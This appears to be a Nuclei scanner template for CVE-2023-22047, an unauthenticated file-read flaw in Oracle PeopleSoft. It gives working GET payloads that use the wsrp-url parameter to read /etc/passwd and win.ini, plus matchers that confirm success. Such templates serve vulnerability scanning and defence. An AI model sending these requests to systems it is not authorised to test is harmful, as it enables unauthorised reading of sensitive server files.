id: CVE-2023-22047

info:
  name: Oracle Peoplesoft Unauthenticated File Read Vulnerability
  author: tuo4n8
  severity: critical
  description: |
    Vulnerability in the PeopleSoft Enterprise PeopleTools product of Oracle PeopleSoft. Supported versions that are affected are 8.59 and 8.60. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise PeopleSoft Enterprise PeopleTools. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all PeopleSoft Enterprise PeopleTools accessible data.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to read sensitive files, reveal sensitive information, and potentially execute arbitrary code on the affected system. This could lead to unauthorized access to critical data and compromise the integrity of the system.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22047
    - https://x.com/tuo4n8/status/1907279143517266286
  metadata:
    max-request: 1
    vendor: weberr
    product: oracle-peoplesoft
  tags: oracle,peoplesoft

http:
  - method: GET
    path:
      - "{{BaseURL}}/RP?wsrp-url=file:///etc/passwd"
      - "{{BaseURL}}/RP?wsrp-url=file:///c:\\windows\\win.ini"

    matchers-condition: and
    stop-at-first-match: true
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
          - "bit app support"
        condition: or

      - type: status
        status:
          - 200